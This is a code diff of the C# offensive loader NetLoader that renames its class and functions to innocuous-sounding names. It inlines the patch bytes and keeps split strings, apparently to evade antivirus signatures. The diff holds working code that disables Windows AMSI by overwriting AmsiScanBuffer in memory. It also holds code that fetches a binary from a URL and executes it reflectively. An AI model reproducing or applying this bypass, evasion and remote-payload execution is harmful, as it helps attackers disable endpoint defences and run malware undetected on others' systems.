@@ -8,7 +8,7 @@ using System.Text.RegularExpressions;
 //This if for MSBuild LOL bin stuff later
 //using Microsoft.Build.Framework;
 //using Microsoft.Build.Utilities;
-public class NetLoader
+public class TotallyNotNt
 {
     static WebClient webClient = new WebClient() { };
     static string _repURL = "https://github.com/Flangvik/NetLoader/tree/master/Binaries";
@@ -30,12 +30,7 @@ public class NetLoader
 ~Flangvik  #NetLoader
 ";
         Console.WriteLine(bannerArt);
-
-
-        if (System.Environment.Is64BitOperatingSystem)
-            PatchAnnsi(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 });
-        else
-            PatchAnnsi(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 });
+        MoveLifeAhead(System.Environment.Is64BitOperatingSystem);
 
         while (true)
         {
@@ -62,10 +57,12 @@ public class NetLoader
 
                 int selectedBin = Convert.ToInt32(Console.ReadLine());
 
-                if (selectedBin == 0) {
+                if (selectedBin == 0)
+                {
                     System.Environment.Exit(1);
 
-                } else if (selectedBin - 1 == binList.Count)
+                }
+                else if (selectedBin - 1 == binList.Count)
                 {
                     Console.WriteLine("[+] Input your own URL / Local Path / direct link to binary");
                     string binUrl = Console.ReadLine();
@@ -116,12 +113,12 @@ public class NetLoader
             else
             {
                 binarySource = File.ReadAllBytes(customUrl);
-             
+
             }
-            
+
         }
 
-   
+
 
         System.Reflection.Assembly.Load(binarySource).EntryPoint.Invoke(0, new object[] { new string[] { arguments } });
 
@@ -143,20 +140,37 @@ public class NetLoader
         return avBinaries;
 
     }
-    private static void PatchAnnsi(byte[] magicJuice)
+    private static void MoveLifeAhead(bool BigBoy = false)
     {
         try
         {
-            Console.WriteLine("[+] Patching AM" + "SI ...");
-            IntPtr lib = WinLibBase.LoadLibrary("am" + "si.dll");
-            IntPtr addr = WinLibBase.GetProcAddress(lib, "Am" + "siSca" + "nBuffer");
-            uint oldProtect = 0; 
-            WinLibBase.VirtualProtect(addr, (UIntPtr)magicJuice.Length, 0x40, out oldProtect);
+            if (BigBoy)
+            {
+                Console.WriteLine("[+] Patching AM" + "SI ...");
 
-            Marshal.Copy(magicJuice, 0, addr, magicJuice.Length);
+                uint someNumber = 0;
+                IntPtr addr = WinLibBase.GetProcAddress(WinLibBase.LoadLibrary("am" + "si.dll"), "Am" + "siSca" + "nBuffer");
+                WinLibBase.VirtualProtect(addr, (UIntPtr)new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }.Length, 0x40, out someNumber);
 
-            Console.WriteLine("[+] Patched!");
-            
+                Marshal.Copy(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }, 0, addr, new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }.Length);
+
+                Console.WriteLine("[+] Patched!");
+            }
+            else
+            {
+                Console.WriteLine("[+] Patching AM" + "SI ...");
+
+                uint someNumber = 0;
+                IntPtr addr = WinLibBase.GetProcAddress(WinLibBase.LoadLibrary("am" + "si.dll"), "Am" + "siSca" + "nBuffer");
+                WinLibBase.VirtualProtect(addr, (UIntPtr)new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 }.Length, 0x40, out someNumber);
+
+                Marshal.Copy(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 }, 0, addr, new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 }.Length);
+
+                Console.WriteLine("[+] Patched!");
+
+            }
+
+
         }
         catch (Exception ex)
         {
